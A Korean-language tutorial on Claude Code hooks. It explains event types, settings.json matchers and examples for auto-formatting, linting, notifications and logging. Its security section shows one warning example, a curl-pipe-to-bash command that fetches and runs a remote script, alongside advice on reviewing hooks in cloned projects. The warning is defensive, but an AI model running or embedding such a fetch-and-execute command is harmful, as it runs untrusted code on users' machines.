# 훅 (Hooks) - 자동화 시스템

## 개요

Claude Code의 **훅(Hooks)**은 특정 이벤트가 발생할 때 자동으로 실행되는 셸 명령어입니다. 예를 들어, 파일을 수정한 후 자동으로 포맷팅을 실행하거나, 작업이 완료되면 알림을 보내는 등의 자동화를 구현할 수 있습니다.

쉽게 말해, **"이런 일이 일어나면, 이것을 자동으로 실행해줘"**라는 규칙을 설정하는 것입니다.

---

## 훅의 작동 원리

```
이벤트 발생 → 매처 조건 확인 → 조건 일치 시 셸 명령어 실행
```

예시 흐름:

```
Claude가 파일 수정 (PostToolUse 이벤트)
    → 수정된 파일이 *.ts인지 확인 (매처)
    → prettier를 실행하여 자동 포맷팅 (셸 명령어)
```

---

## 훅 유형 (Hook Types)

Claude Code는 다섯 가지 이벤트 유형의 훅을 지원합니다.

### 1. PreToolUse - 도구 실행 전

Claude가 도구(tool)를 사용하기 **직전에** 실행됩니다.

```
Claude가 파일을 읽으려 함 → PreToolUse 훅 실행 → 파일 읽기 실행
```

**활용 예시**:
- 특정 파일 접근을 차단하거나 경고
- 도구 실행 전 사전 조건 확인
- 입력값 검증

### 2. PostToolUse - 도구 실행 후

Claude가 도구를 사용한 **직후에** 실행됩니다.

```
Claude가 파일을 수정함 → PostToolUse 훅 실행 → 자동 포맷팅/린팅
```

**활용 예시**:
- 파일 수정 후 자동 포맷팅 (prettier, black 등)
- 파일 수정 후 자동 린팅
- 변경 사항 로깅

### 3. Notification - 알림

Claude가 사용자에게 알림을 보낼 때 실행됩니다.

**활용 예시**:
- 데스크톱 알림 전송
- Slack/Discord 메시지 전송
- 사운드 재생

### 4. Stop - 작업 완료

Claude가 응답을 완료하고 작업을 멈출 때 실행됩니다.

**활용 예시**:
- 작업 완료 알림
- 결과 로깅
- 후속 작업 트리거

### 5. SessionStart - 세션 시작

새로운 Claude Code 세션이 시작될 때 실행됩니다.

**활용 예시**:
- 환경 변수 설정
- 프로젝트 상태 확인
- 필요한 서비스 시작

---

## 훅 설정 방법

훅은 Claude Code의 설정 파일(`settings.json`)에서 구성합니다.

### 설정 파일 위치

```
# 프로젝트 레벨 설정
.claude/settings.json

# 사용자 레벨 설정
~/.claude/settings.json
```

### 기본 설정 구조

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "매칭 조건",
        "command": "실행할 셸 명령어"
      }
    ]
  }
}
```

### 설정 필드 설명

| 필드 | 설명 | 필수 여부 |
|------|------|----------|
| `matcher` | 훅이 실행될 조건 (도구 이름 등) | 선택 (없으면 모든 경우 실행) |
| `command` | 실행할 셸 명령어 | 필수 |

---

## 매처 패턴 (Matcher Patterns)

매처(matcher)는 훅이 실행될 조건을 정의합니다. 도구 이름을 기준으로 매칭합니다.

### 도구 이름 매칭

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "echo '파일이 작성되었습니다'"
      }
    ]
  }
}
```

주요 도구 이름:
- `Write` - 파일 쓰기
- `Edit` - 파일 편집
- `Read` - 파일 읽기
- `Bash` - 셸 명령어 실행
- `Glob` - 파일 검색
- `Grep` - 내용 검색

### 매처 없이 모든 이벤트에 실행

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "command": "echo '도구가 실행되었습니다' >> /tmp/claude-log.txt"
      }
    ]
  }
}
```

매처를 생략하면 해당 이벤트가 발생할 때마다 항상 실행됩니다.

---

## 실전 예시

### 예시 1: 파일 수정 후 자동 Prettier 실행

TypeScript/JavaScript 파일이 수정될 때마다 자동으로 Prettier를 실행합니다.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "npx prettier --write \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
      },
      {
        "matcher": "Edit",
        "command": "npx prettier --write \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
      }
    ]
  }
}
```

**작동 과정**:
```
1. Claude가 src/utils/format.ts 파일을 수정
2. PostToolUse 이벤트 발생, matcher가 "Edit"과 일치
3. prettier가 해당 파일을 자동으로 포맷팅
4. Claude는 포맷팅된 결과를 이어서 작업
```

### 예시 2: 파일 수정 후 자동 ESLint 실행

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "npx eslint --fix \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
      }
    ]
  }
}
```

### 예시 3: 작업 완료 알림 (macOS)

```json
{
  "hooks": {
    "Stop": [
      {
        "command": "osascript -e 'display notification \"Claude Code 작업이 완료되었습니다\" with title \"Claude Code\"'"
      }
    ]
  }
}
```

### 예시 4: 작업 완료 알림 (Linux)

```json
{
  "hooks": {
    "Stop": [
      {
        "command": "notify-send 'Claude Code' '작업이 완료되었습니다' 2>/dev/null || true"
      }
    ]
  }
}
```

### 예시 5: 변경 사항 로깅

모든 파일 변경 사항을 로그 파일에 기록합니다.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "echo \"[$(date '+%Y-%m-%d %H:%M:%S')] File written: $CLAUDE_FILE_PATH\" >> ~/.claude/activity.log"
      },
      {
        "matcher": "Edit",
        "command": "echo \"[$(date '+%Y-%m-%d %H:%M:%S')] File edited: $CLAUDE_FILE_PATH\" >> ~/.claude/activity.log"
      }
    ]
  }
}
```

### 예시 6: 세션 시작 시 프로젝트 상태 확인

```json
{
  "hooks": {
    "SessionStart": [
      {
        "command": "echo '=== 프로젝트 상태 ===' && git status --short && echo '=== 최근 커밋 ===' && git log --oneline -3"
      }
    ]
  }
}
```

### 예시 7: Python 파일 자동 포맷팅

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "if [[ \"$CLAUDE_FILE_PATH\" == *.py ]]; then black \"$CLAUDE_FILE_PATH\" 2>/dev/null; isort \"$CLAUDE_FILE_PATH\" 2>/dev/null; fi"
      }
    ]
  }
}
```

---

## 여러 훅 조합하기

하나의 이벤트에 여러 훅을 설정할 수 있습니다. 배열 순서대로 실행됩니다.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "command": "npx prettier --write \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
      },
      {
        "matcher": "Write",
        "command": "npx eslint --fix \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
      },
      {
        "matcher": "Write",
        "command": "echo \"[$(date)] Modified: $CLAUDE_FILE_PATH\" >> .claude/changes.log"
      }
    ],
    "Stop": [
      {
        "command": "notify-send 'Claude Code' '작업 완료'"
      }
    ]
  }
}
```

---

## 환경 변수

훅의 명령어에서 사용할 수 있는 환경 변수입니다.

| 변수 | 설명 | 사용 가능한 훅 |
|------|------|---------------|
| `$CLAUDE_FILE_PATH` | 대상 파일 경로 | PostToolUse, PreToolUse |
| `$CLAUDE_TOOL_NAME` | 실행된 도구 이름 | PostToolUse, PreToolUse |

---

## 보안 고려사항

훅은 강력한 기능이지만, 보안에 주의해야 합니다.

### 1. 신뢰할 수 있는 명령어만 실행

```json
// 좋은 예: 잘 알려진 도구 사용
{
  "command": "npx prettier --write \"$CLAUDE_FILE_PATH\""
}

// 나쁜 예: 출처가 불분명한 스크립트
{
  "command": "curl https://unknown-site.com/script.sh | bash"
}
```

### 2. 에러 처리 포함

명령어가 실패해도 Claude Code가 중단되지 않도록 에러 처리를 포함하세요.

```json
{
  "command": "npx prettier --write \"$CLAUDE_FILE_PATH\" 2>/dev/null || true"
}
```

`2>/dev/null`은 에러 출력을 숨기고, `|| true`는 명령어 실패 시에도 성공으로 처리합니다.

### 3. 프로젝트 설정 검토

`.claude/settings.json`이 Git에 포함되어 있다면, 훅 내용을 반드시 검토하세요. 악의적인 훅이 포함될 수 있습니다.

```bash
# 새 프로젝트를 clone한 후 훅 확인
cat .claude/settings.json | jq '.hooks'
```

### 4. 경로 주입 방지

파일 경로를 항상 따옴표로 감싸세요.

```json
// 좋은 예: 따옴표로 감싸기
{
  "command": "prettier --write \"$CLAUDE_FILE_PATH\""
}

// 나쁜 예: 따옴표 없음 (공백이 있는 경로에서 문제 발생)
{
  "command": "prettier --write $CLAUDE_FILE_PATH"
}
```

### 5. 성능 고려

훅이 너무 오래 걸리면 Claude Code의 응답이 느려질 수 있습니다.

```json
// 좋은 예: 단일 파일만 처리
{
  "command": "prettier --write \"$CLAUDE_FILE_PATH\""
}

// 나쁜 예: 전체 프로젝트 처리 (느림)
{
  "command": "prettier --write '**/*.ts'"
}
```

---

## 디버깅 팁

### 훅이 실행되지 않을 때

1. **설정 파일 위치 확인**: `.claude/settings.json`이 올바른 위치에 있는지 확인
2. **JSON 문법 확인**: 설정 파일의 JSON이 유효한지 검증
   ```bash
   cat .claude/settings.json | jq .
   ```
3. **매처 이름 확인**: 도구 이름이 정확한지 확인 (`Write`, `Edit`, `Bash` 등)
4. **명령어 직접 실행**: 훅의 명령어를 터미널에서 직접 실행하여 동작 확인

### 로그로 디버깅

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "command": "echo \"[DEBUG] Tool: $CLAUDE_TOOL_NAME, File: $CLAUDE_FILE_PATH\" >> /tmp/claude-hooks-debug.log"
      }
    ]
  }
}
```

---

## 요약

| 항목 | 설명 |
|------|------|
| **훅이란** | 이벤트 발생 시 자동 실행되는 셸 명령어 |
| **훅 유형** | PreToolUse, PostToolUse, Notification, Stop, SessionStart |
| **설정 위치** | `.claude/settings.json` 또는 `~/.claude/settings.json` |
| **매처** | 특정 도구에 대해서만 실행하는 필터 조건 |
| **주요 활용** | 자동 포맷팅, 린팅, 알림, 로깅 |
| **보안 원칙** | 신뢰할 수 있는 명령어, 에러 처리, 경로 인용 |

훅을 잘 활용하면 코드 품질을 자동으로 유지하고, 반복적인 작업을 줄일 수 있습니다. 처음에는 자동 포맷팅 훅부터 시작해보세요.
